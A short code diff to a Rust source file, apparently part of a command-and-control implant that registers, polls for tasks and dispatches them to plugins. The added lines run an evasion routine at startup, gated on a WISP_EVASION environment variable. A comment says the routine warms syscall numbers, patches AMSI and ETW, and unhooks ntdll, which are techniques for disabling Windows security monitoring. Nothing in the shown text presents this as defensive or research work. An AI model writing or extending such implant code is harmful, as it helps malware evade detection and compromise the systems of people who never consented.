@@ -210,6 +210,15 @@ pub fn parse_tasks(data: &[u8]) -> Vec<Task> {
 /// M0/M1 core: register then poll; M1 will dispatch tasks to plugins.
 pub fn agent_run(_is_dll: bool) {
     let cfg = crate::overlay::load_with_overlay();
+
+    // Optional evasion bootstrap at startup (WISP_EVASION=1): warm SSNs, patch
+    // AMSI/ETW, unhook ntdll. Each step is panic-protected.
+    #[cfg(feature = "evasion")]
+    if std::env::var("WISP_EVASION").map(|v| v == "1").unwrap_or(false) {
+        crate::evasion::apply_evasion();
+        eprintln!("[agent] evasion applied");
+    }
+
     if cfg.rsa_pub_pem.is_empty()
         && cfg.transport != "tcp"
         && cfg.transport != "kcp"
